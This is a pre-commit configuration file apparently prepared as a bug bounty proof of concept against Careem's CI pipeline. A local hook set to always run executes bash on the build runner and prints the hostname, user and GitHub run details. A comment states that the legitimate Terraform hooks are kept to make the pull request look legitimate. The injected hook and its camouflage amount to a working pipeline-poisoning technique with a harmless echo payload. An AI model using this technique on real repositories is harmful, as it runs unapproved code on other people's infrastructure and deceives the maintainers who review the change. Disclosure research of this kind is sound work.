repos:
  # SECURITY RESEARCH - POC for Careem Bug Bounty
  # This demonstrates arbitrary code execution in CI
  - repo: local
    hooks:
      - id: security-poc-marker
        name: "Security Research PoC - Careem BBP"
        entry: bash -c 'echo "========================================"; echo "SECURITY POC - CAREEM BUG BOUNTY"; echo "Arbitrary code execution confirmed"; echo "Timestamp: $(date -u)"; echo "Runner: $(hostname)"; echo "User: $(whoami)"; echo "PWD: $(pwd)"; echo "GITHUB_REPOSITORY: $GITHUB_REPOSITORY"; echo "GITHUB_ACTOR: $GITHUB_ACTOR"; echo "GITHUB_RUN_ID: $GITHUB_RUN_ID"; echo "========================================"'
        language: system
        always_run: true
        pass_filenames: false

  # Keep original hooks to make PR look legitimate
  - repo: https://github.com/antonbabenko/pre-commit-terraform
    rev: v1.83.0
    hooks:
      - id: terraform_fmt
      - id: terraform_wrapper_module_for_each
      - id: terraform_validate
      - id: terraform_docs
        args:
          - '--args=--lockfile=false'
      - id: terraform_tflint
        args:
          - '--args=--only=terraform_deprecated_interpolation'
          - '--args=--only=terraform_deprecated_index'
          - '--args=--only=terraform_unused_declarations'
          - '--args=--only=terraform_comment_syntax'
          - '--args=--only=terraform_documented_outputs'
          - '--args=--only=terraform_documented_variables'
          - '--args=--only=terraform_typed_variables'
          - '--args=--only=terraform_module_pinned_source'
          - '--args=--only=terraform_naming_convention'
          - '--args=--only=terraform_required_version'
          - '--args=--only=terraform_required_providers'
          - '--args=--only=terraform_standard_module_structure'
          - '--args=--only=terraform_workspace_remote'
  - repo: https://github.com/pre-commit/pre-commit-hooks
    rev: v4.4.0
    hooks:
      - id: check-merge-conflict
      - id: end-of-file-fixer
